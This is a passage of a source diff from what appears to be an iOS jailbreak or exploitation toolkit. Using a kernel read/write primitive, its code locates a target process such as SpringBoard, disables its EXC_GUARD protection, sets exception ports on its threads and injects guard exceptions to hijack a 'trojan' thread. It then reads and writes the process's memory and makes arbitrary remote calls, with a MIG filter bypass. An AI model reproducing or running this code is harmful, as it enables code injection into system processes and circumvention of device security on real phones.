+    // abandon_remote_call takes the IPC mutex; init_remote_call does not hold it here.
+    abandon_remote_call();
+}
+
+void abandon_remote_call_internal(void) {
+    if (g_RC_vphoneBridge) {
+        g_RC_vphoneBridge = false;
+        g_RC_success = false;
+        g_RC_pid = 0;
+        g_RC_threadList = [NSMutableArray new];
+        return;
+    }
+
+    // Skip every SB-side IPC. Caller has decided that the remote task is dead
+    // (typically SpringBoard finished a respawn). Touching the dead trojan
+    // would hang for the call timeout. Local resources still need releasing.
+    //
+    // g_RC_wedgeKeepPorts overrides that decision. It is set when
+    // restore_trojan_thread failed, which means the caller has NOT established that
+    // the remote task is dead -- it means a thread of ours is still in there. Ports
+    // and names are both left alone, so the ports stay armed for it and stay
+    // reachable, and destroy_remote_call() releases them on the proper teardown.
+    // The crossing stays poisoned: only a completed init makes that thread worth
+    // hijacking again.
+    if (g_RC_wedgeKeepPorts) {
+        printf("[%s:%d] wedged trojan — keeping both exception ports alive and armed\n",
+               __FUNCTION__, __LINE__);
+    } else {
+        destroy_exception_port(g_RC_firstExceptionPort);
+        destroy_exception_port(g_RC_secondExceptionPort);
+        g_RC_firstExceptionPort = MACH_PORT_NULL;
+        g_RC_secondExceptionPort = MACH_PORT_NULL;
+    }
+    if (g_RC_dummyThread) pthread_cancel(g_RC_dummyThread);
+    if (MACH_PORT_VALID(g_RC_dummyThreadMach)) {
+        mach_port_deallocate(mach_task_self_, g_RC_dummyThreadMach);
+    }
+    clear_remote_shmem_cache();
+    (void)reap_dead_port_names("abandon_remote_call");
+    g_RC_taskAddr = 0;
+    g_RC_firstExceptionPortAddr = 0;
+    g_RC_secondExceptionPortAddr = 0;
+    g_RC_dummyThread = NULL;
+    g_RC_dummyThreadMach = MACH_PORT_NULL;
+    g_RC_dummyThreadAddr = 0;
+    g_RC_dummyThreadTro = 0;
+    g_RC_selfThreadAddr = 0;
+    g_RC_selfThreadCtid = 0;
+    g_RC_vmMap = 0;
+    g_RC_callThreadAddr = 0;
+    g_RC_trojanThreadAddr = 0;
+    g_RC_pid = 0;
+    g_RC_success = false;
+    g_RC_creatingExtraThread = false;
+    g_RC_vphoneBridge = false;
+    g_RC_trojanMem = 0;
+    g_RC_threadList = [NSMutableArray new];
+}
+
+int destroy_remote_call(void) {
+    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
+    pthread_mutex_lock(&g_universal_ipc_mutex);
+    int res = destroy_remote_call_internal();
+    pthread_mutex_unlock(&g_universal_ipc_mutex);
+    return res;
+}
+
+int destroy_remote_call_internal(void) {
+    if (g_RC_vphoneBridge) {
+        g_RC_vphoneBridge = false;
+        g_RC_pid = 0;
+        g_RC_success = false;
+        g_RC_threadList = [NSMutableArray new];
+        return 0;
+    }
+
+    if (!remote_call_has_local_state()) {
+        clear_remote_shmem_cache();
+        (void)reap_dead_port_names("destroy_remote_call");
+        g_RC_success = false;
+        g_RC_threadList = [NSMutableArray new];
+        return 0;
+    }
+
+    if (g_RC_trojanMem) {
+        do_remote_call_stable(100, "munmap", g_RC_trojanMem, PAGE_SIZE, 0, 0, 0, 0, 0, 0);
+        g_RC_trojanMem = 0;
+    }
+    if (g_RC_creatingExtraThread) {
+        // This is the call that kills the wedged thread, and it was being REFUSED:
+        // crossingPoisoned short-circuits do_remote_call_stable, which is the only
+        // way to make this call. So destroy removed the catcher and then, by the
+        // same latch, declined to remove the thread it belonged to.
+        //
+        // The refusal is right for ordinary callers and wrong here, so the escape is
+        // explicit: clear the latch, kill the thread, then put it back. Nothing runs
+        // between those two points, since destroy holds the IPC mutex.
+        if (g_RC_crossingPoisoned) {
+            g_RC_crossingPoisoned = false;
+            do_remote_call_stable(-1, "pthread_exit", 0, 0, 0, 0, 0, 0, 0, 0);
+            g_RC_crossingPoisoned = true;
+        } else {
+            do_remote_call_stable(-1, "pthread_exit", 0, 0, 0, 0, 0, 0, 0, 0);
+        }
+    }
+    else {
+        restore_trojan_thread(&g_RC_originalState);
+    }
+
+    // Same rule as abandon: a thread that is still parked on a sentinel needs its
+    // ports. destroy normally reaches here with the original thread already restored,
+    // in which case there is nothing to protect and this is false.
+    if (g_RC_wedgeKeepPorts) {
+        printf("[%s:%d] wedged trojan — keeping both exception ports alive and armed\n",
+               __FUNCTION__, __LINE__);
+        g_RC_firstExceptionPort = MACH_PORT_NULL;
+        g_RC_secondExceptionPort = MACH_PORT_NULL;
+    } else {
+        destroy_exception_port(g_RC_firstExceptionPort);
+        destroy_exception_port(g_RC_secondExceptionPort);
+    }
+    if (g_RC_dummyThread) pthread_cancel(g_RC_dummyThread);
+    if (MACH_PORT_VALID(g_RC_dummyThreadMach)) {
+        mach_port_deallocate(mach_task_self_, g_RC_dummyThreadMach);
+    }
+    clear_remote_shmem_cache();
+    (void)reap_dead_port_names("destroy_remote_call");
+    g_RC_taskAddr = 0;
+    g_RC_firstExceptionPort = MACH_PORT_NULL;
+    g_RC_secondExceptionPort = MACH_PORT_NULL;
+    g_RC_firstExceptionPortAddr = 0;
+    g_RC_secondExceptionPortAddr = 0;
+    g_RC_dummyThread = NULL;
+    g_RC_dummyThreadMach = MACH_PORT_NULL;
+    g_RC_dummyThreadAddr = 0;
+    g_RC_dummyThreadTro = 0;
+    g_RC_selfThreadAddr = 0;
+    g_RC_selfThreadCtid = 0;
+    g_RC_vmMap = 0;
+    g_RC_callThreadAddr = 0;
+    g_RC_trojanThreadAddr = 0;
+    g_RC_pid = 0;
+    g_RC_success = false;
+    g_RC_creatingExtraThread = false;
+    // The original thread is back, so nothing of ours is left in SpringBoard to
+    // poison or to protect. This is also the teardown that releases any ports a
+    // wedged abandon had to keep.
+    g_RC_crossingPoisoned = false;
+    g_RC_wedgeKeepPorts = false;
+    g_RC_vphoneBridge = false;
+    g_RC_trojanMem = 0;
+
+    g_RC_threadList = [NSMutableArray new];
+
+    return 0;
+}
+
+bool remote_call_has_local_state(void) {
+    return g_RC_vphoneBridge ||
+           g_RC_taskAddr ||
+           MACH_PORT_VALID(g_RC_firstExceptionPort) ||
+           MACH_PORT_VALID(g_RC_secondExceptionPort) ||
+           g_RC_firstExceptionPortAddr ||
+           g_RC_secondExceptionPortAddr ||
+           g_RC_dummyThread ||
+           MACH_PORT_VALID(g_RC_dummyThreadMach) ||
+           g_RC_dummyThreadAddr ||
+           g_RC_dummyThreadTro ||
+           g_RC_vmMap ||
+           g_RC_callThreadAddr ||
+           g_RC_trojanThreadAddr ||
+           g_RC_pid ||
+           g_RC_trojanMem;
+}
+
+struct VMShmem *get_shmem_from_cache(uint64_t pageAddr)
+{
+    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
+        if (g_RC_shmemCache[i].used && g_RC_shmemCache[i].remoteAddress == pageAddr) {
+            g_RC_shmemUseCounter[i] = ++g_RC_shmemClock;
+            return &g_RC_shmemCache[i];
+        }
+    }
+    return NULL;
+}
+
+struct VMShmem *put_shmem_in_cache(struct VMShmem *shmem)
+{
+    int slot = -1;
+    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
+        if (!g_RC_shmemCache[i].used) { slot = i; break; }
+    }
+    if (slot < 0) {
+        uint64_t oldest = UINT64_MAX;
+        for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
+            if (g_RC_shmemUseCounter[i] < oldest) {
+                oldest = g_RC_shmemUseCounter[i];
+                slot = i;
+            }
+        }
+        if (slot < 0) {
+            printf("[%s:%d] g_RC_shmemCache eviction failed\n", __FUNCTION__, __LINE__);
+            return NULL;
+        }
+        release_shmem_slot(slot);
+        uint64_t events = ++g_RC_shmemEvictions;
+        if (events == 1 || (events % 256) == 0) {
+            printf("[RemoteCall] shmem cache LRU evicted slot=%d events=%llu\n",
+                   slot, (unsigned long long)events);
+        }
+    }
+    g_RC_shmemCache[slot] = *shmem;
+    g_RC_shmemCache[slot].used = true;
+    g_RC_shmemUseCounter[slot] = ++g_RC_shmemClock;
+    return &g_RC_shmemCache[slot];
+}
+
+struct VMShmem *get_shmem_for_page(uint64_t pageAddr)
+{
+    struct VMShmem *cached = get_shmem_from_cache(pageAddr);
+    if (cached) return cached;
+
+    struct VMShmem newShmem = vm_map_remote_page(g_RC_vmMap, pageAddr);
+    if (!newShmem.localAddress) {
+        static volatile uint64_t shmemRetryEvents = 0;
+        uint64_t events = __sync_add_and_fetch(&shmemRetryEvents, 1);
+        if (events == 1 || (events % 64) == 0) {
+            printf("[RemoteCall] shmem map failed page=0x%llx; clearing cache and retrying event=%llu\n",
+                   pageAddr, (unsigned long long)events);
+        }
+        clear_remote_shmem_cache();
+        (void)reap_dead_port_names("shmem_retry");
+        newShmem = vm_map_remote_page(g_RC_vmMap, pageAddr);
+    }
+    if (!newShmem.localAddress)
+            return NULL;
+    return put_shmem_in_cache(&newShmem);
+}
+
+bool remote_read(uint64_t src, void *dst, uint64_t size)
+{
+    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
+    pthread_mutex_lock(&g_universal_ipc_mutex);
+    bool res = remote_read_internal(src, dst, size);
+    pthread_mutex_unlock(&g_universal_ipc_mutex);
+    return res;
+}
+
+bool remote_read_internal(uint64_t src, void *dst, uint64_t size)
+{
+    if (g_RC_vphoneBridge)
+        return rc_vphone_bridge_read(src, dst, size);
+
+    if (!src || !dst || !size) return false;
+    src = native_strip(src);
+    uint64_t dstAddr = (uint64_t)(uintptr_t)dst;
+    uint64_t until = src + size;
+
+    while (src < until) {
+        uint64_t remaining = until - src;
+        uint64_t offs      = src & PAGE_MASK;
+        uint64_t roundUp   = (src + PAGE_SIZE) & ~PAGE_MASK;
+        uint64_t copyCount = (roundUp - src < remaining) ? (roundUp - src) : remaining;
+        uint64_t pageAddr  = src & ~PAGE_MASK;
+
+        struct VMShmem *page = get_shmem_for_page(pageAddr);
+        if (!page) {
+            NSLog(@"[RemoteCall] DIAG remote_read FAIL no page for src=0x%llx",
+                  (unsigned long long)src);
+            return false;
+        }
+        memcpy((void *)(uintptr_t)dstAddr, (void *)(uintptr_t)(page->localAddress + offs), (size_t)copyCount);
+        src     += copyCount;
+        dstAddr += copyCount;
+    }
+    return true;
+}
+
+uint64_t remote_read64(uint64_t src)
+{
+    uint64_t val = 0;
+    if (!remote_read(src, &val, sizeof(val))) return 0;
+    return val;
+}
+
+void remote_hexdump(uint64_t remoteAddr, size_t size)
+{
+    uint8_t *buf = (uint8_t *)malloc(size);
+    if (!buf) {
+        return;
+    }
+
+    if (!remote_read(remoteAddr, buf, size)) {
+        printf("[%s:%d] remote_read failed at 0x%llx\n", __FUNCTION__, __LINE__, (unsigned long long)remoteAddr);
+        free(buf);
+        return;
+    }
+
+    char ascii[17];
+    ascii[16] = '\0';
+    for (size_t i = 0; i < size; ++i) {
+        if ((i % 16) == 0)
+            printf("[0x%016llx+0x%03zx] ", (unsigned long long)remoteAddr, i);
+
+        printf("%02X ", buf[i]);
+        ascii[i % 16] = (buf[i] >= ' ' && buf[i] <= '~') ? buf[i] : '.';
+
+        if ((i + 1) % 8 == 0 || i + 1 == size) {
+            printf(" ");
+            if ((i + 1) % 16 == 0) {
+                printf("|  %s \n", ascii);
+            } else if (i + 1 == size) {
+                ascii[(i + 1) % 16] = '\0';
+                if ((i + 1) % 16 <= 8) printf(" ");
+                for (size_t j = (i + 1) % 16; j < 16; ++j)
+                    printf("   ");
+                printf("|  %s \n", ascii);
+            }
+        }
+    }
+
+    free(buf);
+}
+
+bool remote_write(uint64_t dst, const void *src, uint64_t size)
+{
+    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
+    pthread_mutex_lock(&g_universal_ipc_mutex);
+    bool res = remote_write_internal(dst, src, size);
+    pthread_mutex_unlock(&g_universal_ipc_mutex);
+    return res;
+}
+
+bool remote_write_internal(uint64_t dst, const void *src, uint64_t size)
+{
+    if (g_RC_vphoneBridge)
+        return rc_vphone_bridge_write(dst, src, size);
+
+    if (!src || !dst || !size) return false;
+    dst = native_strip(dst);
+
+    uint64_t srcAddr = (uint64_t)(uintptr_t)src;
+    uint64_t until   = dst + size;
+
+    while (dst < until) {
+        uint64_t remaining = until - dst;
+        uint64_t offs      = dst & PAGE_MASK;
+        uint64_t roundUp   = (dst + PAGE_SIZE) & ~PAGE_MASK;
+        uint64_t copyCount = (roundUp - dst < remaining) ? (roundUp - dst) : remaining;
+        uint64_t pageAddr  = dst & ~PAGE_MASK;
+
+        struct VMShmem *page = get_shmem_for_page(pageAddr);
+        if (!page) {
+            printf("[%s:%d] remote_write failed: unable to find remote page\n", __FUNCTION__, __LINE__);
+            return false;
+        }
+
+        memcpy((void *)(uintptr_t)(page->localAddress + offs), (const void *)(uintptr_t)srcAddr, (size_t)copyCount);
+        dst     += copyCount;
+        srcAddr += copyCount;
+    }
+    return true;
+}
+
+bool remote_write64(uint64_t dst, uint64_t val)
+{
+    return remote_write(dst, &val, sizeof(val));
+}
+
+bool remote_writeStr(uint64_t dst, const char *str)
+{
+    if (!str) return false;
+
+    size_t len = strlen(str) + 1;
+    return remote_write(dst, str, len);
+}
+
+uint64_t remote_call_trojan_mem(void)
+{
+    return g_RC_trojanMem;
+}
+
+uint64_t retry_first_thread(bool useMigFilterBypass) {
+    if (useMigFilterBypass)
+        mig_bypass_pause();
+
+    sleep(1);
+
+    if (useMigFilterBypass)
+        mig_bypass_resume();
+
+    return kread64(g_RC_taskAddr + off_task_threads_next);
+}
+
+static NSArray<NSNumber *> *collect_all_task_threads(uint64_t taskAddr) {
+    NSMutableArray<NSNumber *> *list = [NSMutableArray new];
+    if (!taskAddr || !is_kaddr_valid(taskAddr)) return list;
+    uint64_t curr = kread64(taskAddr + off_task_threads_next);
+    int count = 0;
+    while (curr && is_kaddr_valid(curr) && count < 512) {
+        [list addObject:@(curr)];
+        curr = kread64(curr + off_thread_task_threads_next);
+        count++;
+    }
+    return list;
+}
+
+// NOTE: Do not run this function while "attaching xcode" on iOS 18+, it will make device unstable.
+int init_remote_call(const char* process, bool useMigFilterBypass) {
+    clear_remote_shmem_cache();
+    remote_call_note_init_failure(RemoteCallInitFailureNone, 0);
+    g_RC_vphoneBridge = false;
+    // crossingPoisoned clears here: a fresh trojan thread is a fresh subject, and
+    // refusing to talk to it would leave the overlay permanently dead.
+    //
+    // wedgeKeepPorts does NOT clear here. This runs before any new thread exists, so
+    // clearing it would disarm the catcher for a thread that is still parked on
+    // 0x401 inside SpringBoard from the previous session -- which init then walks
+    // past while scanning for a thread to hijack. Only destroy clears it, because
+    // destroy is the path that actually kills or restores the thread. The cost of
+    // holding it is two mach ports for the life of the process, which is nothing
+    // next to a SpringBoard that cannot be brought back without a respawn.
+    g_RC_crossingPoisoned = false;
+
+    if (cyanide_vphone_debug_build() &&
+        process && strcmp(process, "SpringBoard") == 0) {
+        if (rc_vphone_bridge_ping()) {
+            g_RC_vphoneBridge = true;
+            g_RC_success = true;
+            g_RC_creatingExtraThread = true;
+            g_RC_pid = (int)rc_vphone_bridge_call(2, 0, "getpid",
+                                                  0, 0, 0, 0, 0, 0, 0, 0);
+            if (g_RC_pid <= 0) g_RC_pid = 1;
+            printf("[VPHONE-BRIDGE] using SpringBoard bridge pid=%d\n", g_RC_pid);
+            return 0;
+        }
+        printf("[VPHONE-BRIDGE] SpringBoard bridge unavailable; falling back to KRW RemoteCall\n");
+    }
+
+    if (!g_kexploit_ready) {
+        printf("[%s:%d] KRW unavailable; refusing RemoteCall init for %s\n",
+               __FUNCTION__, __LINE__, process);
+        remote_call_note_init_failure(RemoteCallInitFailureKRWUnavailable, 0);
+        return -1;
+    }
+
+    uint64_t procAddr;
+    if (g_RC_targetProcOverride) {
+        procAddr = g_RC_targetProcOverride;
+        g_RC_targetProcOverride = 0;
+        printf("[%s:%d] using caller-supplied proc override for %s proc=%#llx\n",
+               __FUNCTION__, __LINE__, process, procAddr);
+    } else {
+        procAddr = proc_find_by_name(process);
+    }
+    if (!procAddr || procAddr == (uint64_t)-1 || !is_kaddr_valid(procAddr + off_proc_p_pid)) {
+        printf("[%s:%d] process not found or invalid: %s proc=%#llx\n",
+               __FUNCTION__, __LINE__, process, procAddr);
+        remote_call_note_init_failure(RemoteCallInitFailureProcessMissing, 0);
+        return -1;
+    }
+    uint32_t targetPid = kread32(procAddr + off_proc_p_pid);
+    printf("[RemoteCall] Found %s in kernel (pid=%u) — preparing EXC_GUARD thread hijack.\n", process, targetPid);
+    RC_DEBUG("[%s:%d] process: %s, pid: %u\n", __FUNCTION__, __LINE__, process, targetPid);
+    g_RC_taskAddr = proc_task(procAddr);
+    if (!g_RC_taskAddr || !is_kaddr_valid(g_RC_taskAddr)) {
+        printf("[%s:%d] invalid task for process %s proc=%#llx task=%#llx\n",
+               __FUNCTION__, __LINE__, process, procAddr, g_RC_taskAddr);
+        remote_call_note_init_failure(RemoteCallInitFailureInvalidTask, targetPid);
+        return -1;
+    }
+
+    uint64_t selfTask = task_self();
+    if (!selfTask || !is_kaddr_valid(selfTask)) {
+        printf("[%s:%d] invalid self task while preparing %s RemoteCall task=%#llx\n",
+               __FUNCTION__, __LINE__, process, selfTask);
+        remote_call_note_init_failure(RemoteCallInitFailureInvalidTask, targetPid);
+        return -1;
+    }
+    RC_DEBUG("[%s:%d] targetTask=%#llx selfTask=%#llx\n",
+             __FUNCTION__, __LINE__, g_RC_taskAddr, selfTask);
+
+    mach_port_t firstExceptionPort = create_exception_port();
+    mach_port_t secondExceptionPort = create_exception_port();
+
+    RC_DEBUG("[%s:%d] firstExceptionPort: 0x%x, secondExceptionPort: 0x%x\n", __FUNCTION__, __LINE__, firstExceptionPort, secondExceptionPort);
+
+    if (!firstExceptionPort || !secondExceptionPort)
+    {
+        printf("[%s:%d] Couldn't create exception ports\n", __FUNCTION__, __LINE__);
+        destroy_exception_port(firstExceptionPort);
+        destroy_exception_port(secondExceptionPort);
+        remote_call_note_init_failure(RemoteCallInitFailureExceptionPort, targetPid);
+        return -1;
+    }
+
+    // Make sure the task won't crash after we handle an exception.
+    if (disable_excguard_kill(g_RC_taskAddr) != 0) {
+        printf("[%s:%d] failed to prepare task_exc_guard for %s task=%#llx\n",
+               __FUNCTION__, __LINE__, process, g_RC_taskAddr);
+        destroy_exception_port(firstExceptionPort);
+        destroy_exception_port(secondExceptionPort);
+        remote_call_note_init_failure(RemoteCallInitFailureTaskGuard, targetPid);
+        return -1;
+    }
+
+    mach_exception_code_t guardCode = 0;
+    EXC_GUARD_ENCODE_TYPE(guardCode, GUARD_TYPE_MACH_PORT);
+    EXC_GUARD_ENCODE_FLAVOR(guardCode, kGUARD_EXC_INVALID_RIGHT);
+    EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503ULL);  // ??? what is 0xf503 value meaning?
+
+    uint64_t firstPortAddr = task_get_ipc_port_kobject(selfTask, firstExceptionPort);
+    uint64_t secondPortAddr = task_get_ipc_port_kobject(selfTask, secondExceptionPort);
+    if (!firstPortAddr || !secondPortAddr)
+        RC_DEBUG("[%s:%d] exception port kobjects first=%#llx second=%#llx (receive ports may have no kobject)\n",
+                 __FUNCTION__, __LINE__, firstPortAddr, secondPortAddr);
+
+    pthread_t dummyThread = NULL;
+    void *dummyFunc = dlsym(RTLD_DEFAULT, "getpid");
+    if (!dummyFunc) {
+        printf("[%s:%d] dlsym(getpid) failed while preparing dummy thread\n",
+               __FUNCTION__, __LINE__);
+        destroy_exception_port(firstExceptionPort);
+        destroy_exception_port(secondExceptionPort);
+        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
+        return -1;
+    }
+    RC_DEBUG("[%s:%d] creating local dummy thread for RemoteCall bootstrap\n",
+             __FUNCTION__, __LINE__);
+    int dummyErr = pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
+    if (dummyErr != 0 || !dummyThread) {
+        printf("[%s:%d] pthread_create_suspended_np(dummy) failed err=%d thread=%p\n",
+               __FUNCTION__, __LINE__, dummyErr, dummyThread);
+        destroy_exception_port(firstExceptionPort);
+        destroy_exception_port(secondExceptionPort);
+        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
+        return -1;
+    }
+    mach_port_t dummyThreadMach = pthread_mach_thread_np(dummyThread);
+    if (!dummyThreadMach) {
+        printf("[%s:%d] pthread_mach_thread_np(dummy) returned null\n",
+               __FUNCTION__, __LINE__);
+        pthread_cancel(dummyThread);
+        destroy_exception_port(firstExceptionPort);
+        destroy_exception_port(secondExceptionPort);
+        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
+        return -1;
+    }
+    RC_DEBUG("[%s:%d] dummyThreadMach=0x%x\n",
+             __FUNCTION__, __LINE__, dummyThreadMach);
+    uint64_t dummyThreadAddr = task_get_ipc_port_kobject(selfTask, dummyThreadMach);
+    if (!is_kaddr_valid(dummyThreadAddr)) {
+        printf("[%s:%d] failed to resolve dummy thread kobject mach=0x%x addr=%#llx\n",
+               __FUNCTION__, __LINE__, dummyThreadMach, dummyThreadAddr);
+        pthread_cancel(dummyThread);
+        mach_port_deallocate(mach_task_self_, dummyThreadMach);
+        destroy_exception_port(firstExceptionPort);
+        destroy_exception_port(secondExceptionPort);
+        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
+        return -1;
+    }
+    RC_DEBUG("[%s:%d] dummyThreadAddr=%#llx\n",
+             __FUNCTION__, __LINE__, dummyThreadAddr);
+    uint64_t dummyThreadTro = kread64(dummyThreadAddr + off_thread_t_tro);
+    if (!is_kaddr_valid(dummyThreadTro)) {
+        printf("[%s:%d] dummy thread tro invalid %#llx\n",
+               __FUNCTION__, __LINE__, dummyThreadTro);
+        pthread_cancel(dummyThread);
+        mach_port_deallocate(mach_task_self_, dummyThreadMach);
+        destroy_exception_port(firstExceptionPort);
+        destroy_exception_port(secondExceptionPort);
+        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
+        return -1;
+    }
+    RC_DEBUG("[%s:%d] dummyThreadTro=%#llx\n",
+             __FUNCTION__, __LINE__, dummyThreadTro);
+    mach_port_t threadSelf = mach_thread_self();
+    uint64_t selfThreadAddr = task_get_ipc_port_kobject(selfTask, threadSelf);
+    if (!is_kaddr_valid(selfThreadAddr)) {
+        printf("[%s:%d] failed to resolve self thread kobject mach=0x%x addr=%#llx\n",
+               __FUNCTION__, __LINE__, threadSelf, selfThreadAddr);
+        pthread_cancel(dummyThread);
+        mach_port_deallocate(mach_task_self_, dummyThreadMach);
+        mach_port_deallocate(mach_task_self_, threadSelf);
+        destroy_exception_port(firstExceptionPort);
+        destroy_exception_port(secondExceptionPort);
+        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
+        return -1;
+    }
+    uint32_t selfThreadCtid = kread32(selfThreadAddr + off_thread_ctid);
+    RC_DEBUG("[%s:%d] selfThreadAddr=%#llx selfThreadCtid=%#x\n",
+             __FUNCTION__, __LINE__, selfThreadAddr, selfThreadCtid);
+    mach_port_deallocate(mach_task_self_, threadSelf);
+
+    g_RC_creatingExtraThread = true;
+    g_RC_firstExceptionPort = firstExceptionPort;
+    g_RC_secondExceptionPort = secondExceptionPort;
+    g_RC_firstExceptionPortAddr = firstPortAddr;
+    g_RC_secondExceptionPortAddr = secondPortAddr;
+    g_RC_dummyThread = dummyThread;
+    g_RC_dummyThreadMach = dummyThreadMach;
+    g_RC_dummyThreadAddr = dummyThreadAddr;
+    g_RC_dummyThreadTro = dummyThreadTro;
+    g_RC_selfThreadAddr = selfThreadAddr;
+    g_RC_selfThreadCtid = selfThreadCtid;
+
+    g_RC_threadList = [NSMutableArray new];
+
+    int targetInjectedThreadCount = 2;
+    RC_DEBUG("[%s:%d] Target injected threads: %d\n",
+             __FUNCTION__, __LINE__, targetInjectedThreadCount);
+
+    int retryCount = 0;
+    int validThreadCount = 0;
+    int successThreadCount = 0;
+    uint64_t firstThread = kread64(g_RC_taskAddr + off_task_threads_next);
+    if (!firstThread || !is_kaddr_valid(firstThread)) {
+        printf("[%s:%d] invalid first thread for process %s task=%#llx firstThread=%#llx\n",
+               __FUNCTION__, __LINE__, process, g_RC_taskAddr, firstThread);
+        remote_call_note_init_failure(RemoteCallInitFailureNoTargetThreads, targetPid);
+        destroy_remote_call();
+        return -1;
+    }
+    uint64_t currThread = firstThread;
+
+    g_RC_trojanThreadAddr = 0;
+
+    if (useMigFilterBypass)
+        mig_bypass_resume();
+
+    while (successThreadCount < targetInjectedThreadCount && validThreadCount < 5 && retryCount < 3) {
+        uint64_t task = thread_get_task(currThread);
+        if (!task) {
+            if (!validThreadCount) {
+                printf("[%s:%d] failed on getting first thread at all, resetting\n", __FUNCTION__, __LINE__);
+                firstThread = retry_first_thread(useMigFilterBypass);
+                currThread = firstThread;
+                retryCount++;
+                continue;
+            } else {
+                break;
+            }
+        }
+
+        if (task == g_RC_taskAddr) {
+            if (!set_exception_port_on_thread(g_RC_firstExceptionPort, currThread, useMigFilterBypass)) {
+                printf("[%s:%d] Set exception port on thread:0x%llx failed\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
+                if (!validThreadCount) {
+                    printf("[%s:%d] failed on first thread, resetting first thread and currThread\n", __FUNCTION__, __LINE__);
+                    firstThread = retry_first_thread(useMigFilterBypass);
+                    currThread = firstThread;
+                    retryCount++;
+                    continue;
+                }
+            } else {
+                // Inject a EXC_GUARD exception on this thread
+                if (!inject_guard_exception(currThread, guardCode)) {
+                    printf("[%s:%d] Inject EXC_GUARD on thread:0x%llx failed, not injecting\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
+                    if (!validThreadCount) {
+                        printf("[%s:%d] failed on first thread, resetting first thread and currThread\n", __FUNCTION__, __LINE__);
+                        firstThread = retry_first_thread(useMigFilterBypass);
+                        currThread = firstThread;
+                        retryCount++;
+                        continue;
+                    }
+                } else {
+                    if (!g_RC_trojanThreadAddr)
+                        g_RC_trojanThreadAddr = currThread;
+                    successThreadCount++;
+                    [g_RC_threadList addObject:@(currThread)];
+                    RC_DIAG("inject[%d] thread=0x%llx trojan=0x%llx%s",
+                            successThreadCount,
+                            (unsigned long long)currThread,
+                            (unsigned long long)g_RC_trojanThreadAddr,
+                            (currThread == g_RC_trojanThreadAddr) ? " (signer)" : "");
+                }
+            }
+            validThreadCount++;
+            if (successThreadCount >= targetInjectedThreadCount) {
+                break;
+            }
+        } else if (task && !validThreadCount) {
+            printf("[%s:%d] Got weird tro on first thread, resetting\n", __FUNCTION__, __LINE__);
+            firstThread = retry_first_thread(useMigFilterBypass);
+            currThread = firstThread;
+            retryCount++;
+            continue;
+        }
+
+        uint64_t next = kread64(currThread + off_thread_task_threads_next);
+        if (!next) {
+            if (!validThreadCount) {
+                printf("[%s:%d] Got empty next thread. Retry\n", __FUNCTION__, __LINE__);
+                firstThread = retry_first_thread(useMigFilterBypass);
+                currThread = firstThread;
+                retryCount++;
+                continue;
+            } else {
+                printf("[%s:%d] Break because of empty next thread\n", __FUNCTION__, __LINE__);
+                break;
+            }
+        }
+        currThread = next;
+    }
+
+    if(useMigFilterBypass)
+        mig_bypass_pause();
+
+    RC_DEBUG("[%s:%d] Valid threads: %d\n", __FUNCTION__, __LINE__, validThreadCount);
+    RC_DEBUG("[%s:%d] Injected threads: %d\n", __FUNCTION__, __LINE__, successThreadCount);
+
+    if (g_RC_threadList.count == 0) {
+        printf("[%s:%d] Exception injection failed. Aborting.\n", __FUNCTION__, __LINE__);
+        remote_call_note_init_failure(RemoteCallInitFailureNoTargetThreads, targetPid);
+        abandon_remote_call();
+        return -1;
+    }
+    NSLog(@"[RemoteCall] EXC_GUARD injected on %lu thread(s) — waiting for trap.",
+          (unsigned long)g_RC_threadList.count);
+
+    ExceptionMessage exc;
+    int firstExceptionTimeoutMS = g_RC_firstExceptionTimeoutMS > 0 ? g_RC_firstExceptionTimeoutMS : 120000;
+    RC_DEBUG("[%s:%d] First exception wait timeout=%dms\n",
+             __FUNCTION__, __LINE__, firstExceptionTimeoutMS);
+    if(!wait_exception(firstExceptionPort, &exc, firstExceptionTimeoutMS, false)) {
+        printf("[%s:%d] Failed to receive first exception within %dms\n",
+               __FUNCTION__, __LINE__, firstExceptionTimeoutMS);
+        for (NSNumber *thread in g_RC_threadList) {
+            clear_guard_exception(thread.unsignedLongLongValue);
+        }
+        remote_call_note_init_failure(RemoteCallInitFailureFirstExceptionTimeout, targetPid);
+        abandon_remote_call();
+        return -1;
+    }
+
+    NSLog(@"[RemoteCall] Thread trapped — hijacking execution inside %s.", process);
+    memcpy(&g_RC_originalState, &exc.threadState, sizeof(arm_thread_state64_internal));
+    RC_DIAG("trap1 process=%s firstThread=0x%llx trojan=0x%llx "
+            "excPC=0x%llx excLR=0x%llx excSP=0x%llx flags=0x%x code=%llu/%llu injected=%lu",
+            process,
+            (unsigned long long)firstThread,
+            (unsigned long long)g_RC_trojanThreadAddr,
+            (unsigned long long)native_strip(exc.threadState.__pc),
+            (unsigned long long)native_strip(exc.threadState.__lr),
+            (unsigned long long)native_strip(exc.threadState.__sp),
+            (unsigned)exc.threadState.__flags,
+            (unsigned long long)exc.codeFirst,
+            (unsigned long long)exc.codeSecond,
+            (unsigned long)g_RC_threadList.count);
+    for (NSUInteger ti = 0; ti < g_RC_threadList.count; ti++) {
+        uint64_t t = g_RC_threadList[ti].unsignedLongLongValue;
+        RC_DIAG("threadList[%lu]=0x%llx%s%s",
+                (unsigned long)ti,
+                (unsigned long long)t,
+                (t == firstThread) ? " first" : "",
+                (t == g_RC_trojanThreadAddr) ? " trojan" : "");
+    }
+
+    for (NSNumber *thread in g_RC_threadList) {
+        clear_guard_exception(thread.unsignedLongLongValue);
+    }
+    RC_DEBUG("[%s:%d] Finish clearing EXC_GUARD from all other threads...\n", __FUNCTION__, __LINE__);
+
+    ExceptionMessage exc2;
+    int desiredTimeout = 1500;
+    int drainHits = 0;
